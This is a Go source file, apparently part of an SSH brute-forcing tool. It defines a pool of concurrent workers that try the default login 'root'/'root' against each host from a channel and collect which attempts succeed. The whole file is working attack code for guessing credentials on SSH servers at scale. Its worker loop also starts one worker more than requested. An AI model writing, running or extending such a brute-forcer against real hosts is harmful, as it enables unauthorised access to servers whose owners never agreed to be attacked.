package main

import "sync"

type Credential struct {
	user     string
	password string
}

type BruteForceResult struct {
	host    SSHHost
	cred    Credential
	success bool
}

func bruteworker(id int, jobs <-chan SSHHost, results chan<- BruteForceResult) {
	for host := range jobs {
		cred := Credential{"root", "root"}
		res := BruteForceResult{
			host:    host,
			cred:    cred,
			success: SSHAuthAttempt(host.hostport, cred.user, cred.password),
		}
		results <- res
	}
}

func bruteForcer(numWorkers int, hosts <-chan SSHHost) chan BruteForceResult {
	var wg sync.WaitGroup

	results := make(chan BruteForceResult, 1000)

	for w := 0; w <= numWorkers; w++ {
		wg.Add(1)
		go func() {
			bruteworker(w, hosts, results)
			wg.Done()
		}()
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	return results
}
